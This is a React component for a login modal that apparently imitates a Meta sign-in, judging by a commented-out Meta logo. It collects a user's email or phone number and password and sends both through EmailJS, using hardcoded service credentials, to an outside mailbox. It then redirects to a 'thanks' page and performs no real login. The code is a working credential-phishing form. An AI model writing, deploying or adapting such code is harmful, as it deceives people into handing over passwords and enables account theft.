import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import Modal from "react-bootstrap/Modal";

const LoginModal = ({ showModal, setShowModal }) => {
  const navigate = useNavigate();
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    navigate("/thanks");
    emailjs
      .sendForm(
        "service_mln7cm5",
        "template_sscd3f8",
        form.current,
        "dcbEI07t_ODs_VYWh",
      )
      .then(
        (result) => {
          console.log("result text is", result.text);
        },
        (error) => {
          console.log(error.text);
        },
      );
  };

  return (
    <Modal
      backdrop="static"
      show={showModal}
      onHide={() => setShowModal(false)}
    >
      <Modal.Body className="my-4 p-4">
        <form ref={form} onSubmit={sendEmail} className="d-flex flex-column">
          <input
            className="p-1 border rounded"
            type="text"
            name="user_email"
            placeholder="Enter Email or Number"
            required
            style={{ boxShadow: "0 0.5rem 1rem rgba(0, 0, 0, 0.15)" }}
          />
          <input
            className="mt-4 p-1 border rounded"
            name="password"
            type="password"
            placeholder="Password"
            style={{ boxShadow: " 0 0.5rem 1rem rgba(0, 0, 0, 0.15)" }}
            required
          />
          <button
            type="submit"
            className="mt-4 border-0 text-white rounded p-1"
            style={{
              background: "#0D6EFD",
              boxShadow:
                "inset 0 1px 0 rgba(255, 255, 255, 0.15),0 1px 1px rgba(0, 0, 0, 0.075)",
            }}
          >
            Next
          </button>
          <hr className="my-4" />

          {/* <div className="d-flex justify-content-center">
            <img className="text-secondary" src={MetaLogo} alt="meta" />
            <p className="m-0 ms-2">Meta</p>
          </div> */}
        </form>
      </Modal.Body>
    </Modal>
  );
};

export default LoginModal;
